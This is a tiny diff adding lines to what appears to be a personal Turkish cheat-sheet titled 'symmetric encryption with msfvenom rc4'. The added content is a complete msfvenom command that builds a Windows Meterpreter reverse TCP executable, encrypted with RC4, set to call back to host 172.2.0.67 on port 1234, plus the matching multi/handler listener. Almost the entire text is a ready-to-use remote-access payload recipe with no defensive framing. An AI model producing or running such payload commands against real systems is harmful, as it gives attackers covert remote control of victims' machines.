@@ -1,1 +1,4 @@
 msfvenom rc4 ile simetrik şifreleme
+
+msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=172.2.0.67 LPORT=1234 rc4password=1234 -f exe
+windows/meterpreter/reverse_tcp_rc4 : exploit/multi/handler
